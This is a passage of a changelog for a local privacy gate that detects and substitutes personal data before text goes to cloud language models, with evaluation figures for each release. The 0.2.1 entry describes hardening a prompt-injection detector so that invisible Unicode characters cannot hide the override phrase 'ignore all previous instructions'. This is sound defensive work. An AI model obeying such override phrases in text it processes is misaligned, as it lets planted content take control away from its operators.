  captured or restored); their tokens count in `output_tokens` and against `max_tokens`.
- `tests/test_cloud_anthropic_messages.py` (offline, fake transport) covers the request and headers, both reply kinds,
  the failures above and the exact-value check on `system`; `tests/test_cloud_live.py` now runs its three documents once
  per leg (`-k openai-compatible`, `-k anthropic-messages`).

### Web UI loaded in a browser for the first time

- Headless Chrome, once as the client (chat session) and once as the Operator (own session), found two console
  errors and one missing display, all fixed. (1) The boundary read every path starting with `/api` as an API path, so
  the page's own script `/api.js` needed a credential: an Operator-only browser session (SEC-04: no client cookie) got
  401 for it and the UI never started. Only `/api` and `/api/...` are API paths now. (2) The page declared no icon, so
  the browser asked for `/favicon.ico` (404, a console error on every load): `favicon.svg` is shipped and linked.
  (3) `withheld_in_url` (R-01) reached the page but was not shown: a reply that put a placeholder inside a web address
  now says, beside the unknown and omitted token warning, how many were left as placeholders.
- `tests/test_web_static.py`: every shipped script is parse-checked without a browser (a tokenizer for brackets,
  strings, template literals, regular expressions and comments, tested on broken snippets; `node --check` as well when
  Node is on PATH); every file `index.html` references exists, every shipped script is loaded or imported and every
  named import is exported; the two fixes above are pinned.
- `tests/test_web_layout.py` (Playwright, skipped without it) pointed at `server/static`, which has never existed, so it
  could not have passed. It now serves `themis_shield/web/static`, falls back to an installed Chrome, and its stale
  fixtures are fixed (the `/api/canary` call, a due time that rendered 01:00 not 11:00, waits for screens that load
  after the click). It passes in Chrome.

### Placeholder legend (v0.4, optional, off by default)

- `[legend] enabled = true` adds one system message to the request sent to the cloud, listing every placeholder it
  carries with the kind of value it hides ("a bank account number", "a date of birth", "a person"), and asks the
  model to keep each placeholder exactly as written. The legend is part of the protected request: checked for
  originals and approved with everything else the cloud sees. Chat requests only.
- A sensitive statement is described generically ("a sensitive statement about a person"). `[legend]
  sensitive_categories = true`, also off by default, names the category instead ("a statement about a person's
  health"), which tells the cloud such a fact exists.
- A placeholder first sent in an earlier turn is described by its class ("an identifier"); history still pairs each
  client message with what was sent for it, the legend left out.

## 0.3.4 (30/10/2026)

**Development measurement only**, like 0.3.2 and 0.3.3: no fresh split has tested it, and a vetting record still quotes
0.3.0's frozen FAIL as its method baseline.

### Friction on clean documents

Split D's clean documents were held for two reasons a rule can tell apart: configuration files that name where a secret
lives, and PII-Tracer values that cannot be what their label says when both LLM finders read the document as clean.
Two switches, on by default:

- `secret-references`: a SECRET finding (from any detector) is dropped when every line it touches assigns only a
  reference (`os.environ['X']`, `process.env.X`, `var.x`, `{{ lookup(...) }}`, `vault:secret/...`, `<your-api-key>`,
  `REPLACE_ME`, a URL whose password slot is a template), declares one (`variable "x" {`), or plainly holds no value
  (an import, a lone brace). A literal value, a default (`os.getenv('X', 'sk-...')`), or any other line keeps the label.
- `tracer-evidence-sanity`: an amount labelled an identifier, a word labelled a URL and a lone role word labelled a
  person are still substituted but no longer hold the document. A date with no birth context labelled a date of birth,
  and a place without a number labelled an address, are treated the same way only when no detector found a person in
  the document: a missed person beside a birth date or a street is the double miss the hold is for.

| Set (development data) | Friction | Released leaks, R_any, R_full, sensitive and QI R_any |
|---|---|---|
| split D half Q | 0.286 -> **0.064** | unchanged |
| split D half C | 0.323 -> **0.161** | unchanged |
| split C | 0.147 -> 0.137 | unchanged |
| v0.1 set | unchanged | unchanged |

A first version of `secret-references` failed this measurement and never shipped: it also passed prose lines with a
short value ("Temporary password: Dune!9301z", "temporary PIN 2970") and released 35 values. A test now runs the rule
over every labelled secret in `eval/cases` and fails if any reads as a reference (DEV-DEBT DD-16).

## 0.3.3 (30/10/2026)

**Development measurement only**, like 0.3.2: no fresh split has tested it, and a vetting record still quotes 0.3.0's
frozen FAIL as its method baseline.

### Sensitive statements (v0.4 item 4)

After 0.3.2, every sensitive statement the gate still missed on the development sets sat in a held document; most
were table cells under a sensitive heading and a person's trade-union role in prose. Two deterministic passes, fixed
vocabulary only (`detectors/statements.py`), each a named switch, on by default:

- `sensitive-columns`: a table column headed police check, criminal history, convictions, union, medical condition,
  disability, religion, sexuality, ethnicity or Indigenous status marks every non-empty cell as a statement of that
  category. A "Clear" or "non-member" still describes the person.
- `union-roles`: a clause that gives a person a trade-union role or act (shop steward, union delegate or member, a
  delegate for the crew, paying or collecting dues, joining the union, the picket line) is a UNION statement. Policy
  text ("Union delegates may attend ..."), credit and student unions, a data steward and a conference delegate are
  not. The statement is the clause, so a log line keeps its time, ticket number and site.

| Set (development data) | Sensitive R_any | R_any | Hard negatives touched | Friction |
|---|---|---|---|---|
| split C | 0.955 -> **0.982** | 0.9905 -> 0.9957 | 562 -> 562 | unchanged |
| split D half C | 0.986 -> **0.995** | 0.9928 -> 0.9941 | 475 -> 476 | unchanged |
| v0.1 set, split D half Q | unchanged | 0.9989 -> 0.9991, unchanged | unchanged | unchanged |

### Fixes

- `themis vet` held a document with a sensitive statement as BLOCK `substitution-failed` instead of ASK: a finder's
  sensitive finding has no statement span. Vet now uses the finding's own span (DEV-DEBT DD-15).

## 0.3.2 (30/10/2026)

**Development measurement only.** These are the first v0.4 detection fixes, measured on the development sets (the
v0.1 set, split C, and split D, which became development data after its v0.3 run). No fresh split has tested them:
a vetting record still quotes 0.3.0's frozen result (FAIL) as the method baseline, and says it is inherited.

### Detection

- `column-identifiers`: a table column headed as a personal identifier (licence, passport, Medicare, tax file,
  national ID, bank account, card, or a staff, employee, student, member, customer, client or patient number) is
  protected cell by cell. Organisation identifiers (incident, order, invoice, asset, ticket, case, reference), row
  counters and properties of an identifier (type, class, expiry, issue date, balance) are not; a bare "ID" counts
  only beside a name or another identifier column. An unquoted comma that shifts later cells protects both candidate
  cells. Such a cell is never cancelled by the organisation's terms or formats.
- `bare-number-formats`: a profile format with no letters in it allow-listed every number of that shape. On split D
  an eight-digit work-order format cancelled every licence number the column pass found. Such a format now counts
  only after its own key words ("Work order 12345678"); a nameless one allow-lists nothing.
- `finder-windows`: a document over 6,000 characters is read by the LLM finders in line-bounded windows (the table
  header repeated, one line of overlap), and every window's values are matched against the whole document. Four
  split D documents (10,000-21,000 characters, 394-504 personal spans) had overflowed one answer and been BLOCKed.
- `detectors-detection-view`: PII-Tracer and the LLM finders read the detection view (invisible characters removed,
  NFKC per character), like the rules and the marking gate, with spans mapped back to the source.
- All four are named switches, on by default; `[detection] fixes = "none"` still reproduces 0.2.1.
- A failed stage now names its kind from a fixed list (`stage-failed:not-enough-memory`, `:target-unavailable`,
  `:runtime`, `:transport`, ...; never a message).

### Measured on development data

Confirmation replay at the release commit, all four development sets, with the earlier finder captures and, for the
54 documents whose prompts changed, today's live answers (both checked: replaying today's capture reproduces the
live run byte for byte):

| Set | Released leaks | R_any | R_full | Sensitive R_any | Clean friction | Hard negatives touched |
|---|---|---|---|---|---|---|
| v0.1 set | 0 -> 0 | 0.9989 -> 0.9989 | 0.9871 -> 0.9871 | 0.997 -> 0.997 | 0.050 -> 0.050 | 306 -> 306 |
| split C | 0 -> 0 | 0.9902 -> 0.9905 | 0.9786 -> 0.9788 | 0.954 -> 0.955 | 0.147 -> 0.147 | 600 -> 562 |
| split D half Q | 2 -> 2 | 0.9809 -> 0.9809 | 0.9801 -> 0.9801 | 0.984 -> 0.984 | 0.286 -> 0.286 | 75 -> 75 |
| split D half C | **26 -> 3** | 0.925 -> **0.993** | 0.893 -> **0.989** | 0.666 -> **0.986** | 0.323 -> 0.323 | 477 -> 475 |

Split D pooled: 28 released spans -> 5. Unprotected spans held only by a finder failure on half C: 274 -> 0. Most of
half C's gain is the long, dense documents now being read at all; for those documents the comparison is today's
live finder answers against 27/10's captured ones, so it includes run-to-run variation. Development data, not an
exam: friction is unchanged and still above the 0.15 rule, and indirect sensitive statements remain the next item.

### Evaluation tooling

- Finder replays are keyed by (case, model, prompt hash), so a windowed document replays every window, and
  `--replay-finders` takes several capture folders (a later one wins).
- The recording client attributes finder calls to the document the engine announces, not by counting calls: a
  windowed document had shifted every later document's capture label in its chunk (detection was unaffected).
- The offset-map contract is property-tested against the detection view; the unused `OffsetMap` skeleton is gone.
- `pytest --shift-clock-days N` runs the suite with the wall clock moved ahead (no date-dependent test at +400 days).

### Development debt

- None open. `docs/DEV-DEBT.md` lists the fourteen items found and fixed or closed on 30/10/2026.

## 0.3.1 (30/10/2026)

No new frozen test: detection is unchanged, so 0.3.0's split D result (FAIL) is the method baseline a
vetting record quotes for this version, and it says so.

### Vetting records

- `themis vet <folder>`: de-identifies a data release (a folder of text files) with the chat path's own steps
  (markings first, tiered detection, policy, the false-positive catalogue and known-miss sweep when enabled), writes
  the derived documents under position-only names, keeps the codebook in a vault file of its own, and writes a
  **vetting record** (`vetting-record.json` and `.md`) in seven parts: identity, classification, the run, the method
  baseline and this release's effectiveness, codebook custody, the inspection checklist and two empty sign-off rows.
  The record holds counts, never values or file names; it is checked against every protected value before it is
  saved. A value found in one document and left in another holds that document. Unresolved ASKs keep the record
  `incomplete`; a person's resolution names the document by position and content hash. Exit codes 0 / 3 / 2. See
  `docs/VETTING-RECORD.md`.
- `themis_shield.vetting`: `vet_release`, `build_record`, `render_markdown`, `method_baseline`, for use from other
  tools. The method baseline quotes the published frozen result (0.3.0: split D, FAIL, 28 released spans).

### Evaluation tooling

- `score.py --labelset themis` maps the gate's labels and its `|`-joined union labels through `label_map.py`
  (`run_eval.py` already did). Split D's pooled scores had been computed with the native label set: the verdict and
  every label-blind measure stand, but typed recall was 0.899, not 0.690, and case-level any-sensitive recall 0.974,
  not 0.935 (docs/DEV-DEBT.md, DD-01).
- The score report separates *leak* (a span touched by no prediction) from *touched-untyped* (touched, but no
  prediction's label maps to it), prints a fingerprint of the label table it used, warns when union labels go
  unmapped, counts discarded prediction spans, and splits held-but-unprotected spans by the hold's first reason.

### Fixes

- A trip-wire test began failing on 29/10/2026 by date alone (a fixed approval date in the harness, a wall-clock
  review). Every register method that takes `now` now defaults to the harness clock.

### Documentation

- `docs/DEV-DEBT.md`: the debt list, kept short. The roadmap's v0.3 section now says what shipped and what moved on;
  the README no longer says every test author was a Claude model.

## 0.3.0 (27/10/2026)

**Evaluation: FAIL.** On split D (404 cases written blind by a Qwen and a Claude author, re-labelled by a DeepSeek
model, committed by hash before the run), v0.3 with the typed tier released 28 personal spans (21 driver licence
numbers in table columns), reached R_any 0.937 and sensitive-statement R_any 0.740, and held 31 of 125 clean
documents (v0.2.1 control: 40). Details in `eval/RESULTS-v0.3.md`; split D and its generators are now published in
`eval/cases/test-d-*.jsonl` and `eval/generator_d/`.

### Deterministic friction fixes

Seven deterministic fixes for v0.2's known friction causes, each a named
switch (`[detection] fixes`, default "all"; "none" restores 0.2.1 exactly;
detection version "v0.1" turns them all off). Measured only by replaying the
captured v0.2 finder answers over the development data (the v0.1 set and
split C); no new held-out split has been run.

- `secret-placeholders`: a secret assignment whose whole value is a template
  placeholder or a secret-manager reference (`${VAULT:...}`, `<set in vault>`,
  `{{ secret }}`, `${{ secrets.X }}`, `%(name)s`, `$(VAR)`, `<REDACTED>`) is
  not a secret. A value glued to placeholder syntax is still caught, now as
  the whole token. Split C: the four configuration files blocked as SECRET are
  released.
- `organisation-contacts`: role mailboxes (generic function or department
  local parts) and Australian inbound numbers (13, 1300, 1800) are still
  substituted but no longer count as evidence for the empty-finder hold.
- `checksum-context`: a TFN-, Medicare- or ABN-valid number labelled by a
  reference word directly before it ("Invoice", "Order no.", "Ticket #") is a
  generic identifier in the rules (still substituted); "TFN" or "tax file" on
  the line keeps the TFN.
- `rule-completeness`: a payment-card rule (issuer prefix, length, Luhn) in
  the `intl` pack; an ACN validator in the `au` pack: a number introduced as
  an ACN that passes the ACN check is company evidence (generic identifier,
  not a TFN, and not evidence for the empty-finder hold). Australian
  validators are cross-tested against an independent implementation.
- `table-role-words`: a table cell that is only a common occupation or role
  word ("Teacher", "Registered nurse") is not a quasi-identifier candidate;
  qualified or rare roles still are.
- `title-tokens`: a leading title in a found name ("Captain", "Sister") is not
  propagated through the document as a name token.
- `contact-brackets`: a contact span that lost its opening bracket still
  matches the whole public number.
- Development replay, all fixes on: split C clean-case friction 0.200 ->
  0.147 (19 -> 14 of 95), over-redaction 605 -> 600, any-label precision
  0.761 -> 0.781; released leaks 0, R_any, sensitive and quasi-identifier
  recall unchanged. The v0.1 set is unchanged on every metric.

### Friction found on real documents (on by default)

A first run over a private slice of real documents (78, never published)
showed causes the synthetic sets never had: secret rules taking URL
components, prose words, card authorisation codes, document identifiers,
SWIFT codes and a passport's machine-readable zone for credentials, and
finder answers that do not match the text only because of line breaks or
no-break spaces. Each fix is a named switch:

- `secret-url-components`: a high-entropy string in a URL is a secret only as
  the value of a credential-named parameter (`token`, `password`, `key`,
  `sig`, `session`, `code` with `state`, ...); any other query value is
  substituted as an identifier; word-only URL paths are not emitted.
- `secret-prose-values`: "PIN <value>" needs digits; "password <word>." is
  not a value.
- `secret-auth-codes`, `secret-document-ids`, `secret-org-codes`,
  `secret-mrz`: card authorisation and promo codes, document and transaction
  identifiers, long digit strings, SWIFT/BIC and biller codes, BIC-prefixed
  bank references and run-together words, and machine-readable zones are
  relabelled (identifier, passport, person) and still substituted, without
  the SECRET block.
- `finder-whitespace`: a finder value not found verbatim is matched token
  for token with any whitespace run standing for any whitespace run (CR/LF,
  NBSP, narrow spaces), then on the NFKC view; such a value is substituted
  but still counts toward the unmatched-values hold. `finder-whitespace-trust`
  (off) would count it as matched: on the real slice that released two
  documents with genuine misses.
- `address-line-numbers`: a street or unit number alone on the line before
  an address joins the address.
- Real slice, replay: BLOCK:secret 17 -> 4 cases (the 4 left include both
  real secrets), clean friction 0.235 -> 0.176, R_full 0.962 -> 0.972,
  released leaks unchanged (11). Development sets: no ratchet change.

### Fixes from an independent review (before the freeze)

- A placeholder with a default value (`${NAME:-value}`, `${NAME:=value}`, `${prop:value}`) or a single word in angle
  brackets is a secret again: only a placeholder with no literal value is exempt (this closed a bypass in the new
  placeholder fix).
- `title-tokens` never drops a given name that is also a title word (Dean, Major, Justice, Sister...).
- A checksum-valid number relabelled by context keeps its checksum result, so the false-positive catalogue's `allow`
  can never reach it.

### Typed-decision tier (off by default)

- `[typed]`: short multiple-choice questions asked prefill-only of the resident 26B, answered by the option letters'
  probabilities in one forward pass, two option orders, label-mass floor and margin band; an unsure answer never
  lifts a hold. Families kept on development data: contact owner, date/duration/number, private person or public
  figure; each may lift a hold only when it is the hold's sole cause, and never a marking, secret, injection,
  unmatched-value or failed-stage hold. "Real person or fiction" was rejected (the 26B confidently called some real
  people fiction) and "unflagged sensitive sentence" was rejected (it only raised friction). `/v1/systemone` adapter
  for decision models (tested against a fake).

### Detector canary

- Fixed synthetic documents run through every detector at start-up, after every model load and periodically; a
  detector that finds less than its known minimum puts the gate in a degraded state that blocks cloud-bound work.
  Catches a model that "succeeds" with nothing (wrong weights, a chat-template change). Per-stage timings recorded.

### A gate that learns (all off by default)

- Known-miss register with a final sweep on the outbound text (rules, context shapes and keyed fingerprints of
  high-entropy strings only; patterns checked for catastrophic backtracking; staleness for imported snapshots only), a
  reviewed false-positive catalogue and an optional cloud trip-wire; see docs/ARCHITECTURE.md. With every feature off, routing, decisions, requests and the audit trail
  are unchanged (tested).

### Documentation

- `docs/ROADMAP.md`, `docs/CODEBOOK-AND-SYNTHETIC-DATA.md` (v0.4 design: typed placeholders with a codebook,
  optional partially synthetic values, per-job date shifting), `docs/SMALL-ENCODER.md` (a small classifier is a
  helper, never a judge) with `eval/ENCODER-RESULTS-2026-10-27.md`, `eval/V03-DEV-LOG.md`.

### Safety

- Safety fix, restore: the placeholder allocator never issues an identifier one hex digit, or one adjacent swap,
  away from one already issued in the conversation, so a cloud answer that damages a single character of a
  placeholder restores that placeholder's value or nothing, never another person's. Before, such near-neighbours
  could coexist: by our estimate about a 2.7% chance in a conversation with 100 placeholders.

## 0.2.1 (27/10/2026)

Security hardening: invisible Unicode characters and compatibility forms no
longer hide a security marking, the injection signal or a rule-pack value.

- Markings: a zero-width character, soft hyphen or similar inside a marking
  (SECRET with a zero-width joiner, CONFIDENTIAL with a zero-width space or a
  soft hyphen), or a marking in full-width letters, was not detected, so a
  local-only document could be released. The marking gate now also reads each
  surface through a shared detection view (every Unicode
  Default_Ignorable_Code_Point removed, NFKC per character) and keeps the
  stricter result: the classification never drops below the raw text's, and
  findings still carry offsets into the original text. Lines holding only
  invisible characters no longer push a banner out of the first three lines.
- Injection signal: fires on the raw text or the detection view, so one
  invisible character inside "ignore all previous instructions" no longer
  hides it.
- Rule packs: the view ignores every default-ignorable code point, not only
  U+200B, U+2060 and U+FEFF, so a ZWNJ, ZWJ, soft hyphen, variation selector
  or tag character inside a phone number or email address no longer hides it
  in whole or in part. Spans cover the whole original value, invisible
  characters included, so substitution removes them too.
- `normalise.detection_view` is the one shared helper; `rules.normalised_view`
  uses it.
- Replay of the captured v0.2 finder answers through this code reproduces the
  v0.2 final runs byte for byte on dev+test (521 cases) and split C (371
  cases): no prediction or decision changed, so every published number stands.
  The published cases contain no invisible character the v0.2 code mishandled,
  so the replay shows no regression; the new tests show the fix.
- Residual: the LLM finders and PII-Tracer still read the raw text (their
  prompts are hashed for capture and replay). Look-alike letters from other
  scripts that NFKC does not fold are not covered.

## 0.2.0 (25/10/2026)

- Tested once on a fresh held-out split written by an independent author (another Claude model): 0 released
  leaks in 3,686 gold spans, quasi-identifier R_any 0.976 (v0.1 policy: 0.738), clean friction 0.200 (v0.1
  policy: 0.358). Fails its own pass rule on friction (limit 0.15); see eval/RESULTS-v0.2.md.

- Policy: when both LLM finders return nothing, only PII-Tracer findings that
  survive the allow-list, with a confidence of at least 0.9 (a floor fitted on
  one development case), count as contrary evidence, by label; a tracer
  document sensitivity of 0.5 or more still holds the document; a date the
  tracer flags that cannot be a date of birth no longer holds a document.
  `[policy] quasi_id_ask` makes a found quasi-identifier hold the document
  for ASK.
- Detection: a column-aware pass marks rare categorical values (role, title,
  team, site, attribute) as quasi-identifiers in tables with identifier-like
  columns or an "anonymised" label; tracer dates with a time of day, bare
  weekdays and the organisation's public dates become OTHER_DATE, and a bare
  weekday or time is cancelled whichever stage found it (known cost: a
  personal date on a public date, or a weekday that was the only touch on a
  statement, goes unredacted); trailing
  punctuation no longer defeats the role-mailbox allow-list; a USI must
  contain a digit (this drops about 1 in 18 genuine USIs from the rule, in
  exchange for about 1 in 32 ordinary ten-letter words no longer matching); the organisation's own ABN is allow-listed even when
  checksum-valid.
- `[detection] version` and `[policy] version` (`v0.2` default; `v0.1`
  restores the evaluated v0.1 behaviour as a negative control).
- Evaluation runner: `--cases`, `--capture-finders` / `--replay-finders`
  (refuses a changed prompt, or a changed model file name, launch arguments
  or context; the weights' content is not hashed), `--gate-version`; timings moved to
  `timings.jsonl`. Development log in `eval/V02-DEV-LOG.md`.

## 0.1.0 (24/10/2026)

First public preview, for synthetic rehearsal only.

- Local gate in front of an OpenAI-compatible cloud endpoint: security
  markings checked first, then rule packs (`core`, `au`, `intl`), PII-Tracer
  and two local LLM finders; opaque placeholder tokens (`⟦P:3fa9c1⟧`) in the
  outgoing request, restored locally in the answer.
- Encrypted per-user vault (AES-256-GCM; DPAPI on Windows, passphrase
  elsewhere), a SQLite job register with second-party approval, a web app
  with an Operator console, and handover packages.
- Claude Code managed hooks (six events), closed by default and opened
  through the `[hooks]` config section.
- Local model runtime: one resident model at a time, owned llama-server
  processes, optional Strata attach and Marian launch planning.
- `themis serve` explains each startup refusal with a reason code;
  `themis --version`; `config/rehearsal.example.toml` for a working
  synthetic rehearsal.
- Evaluation kit and results, measured at tag `eval-kit-v0.1-frozen`
  (`eval/RESULTS.md`).
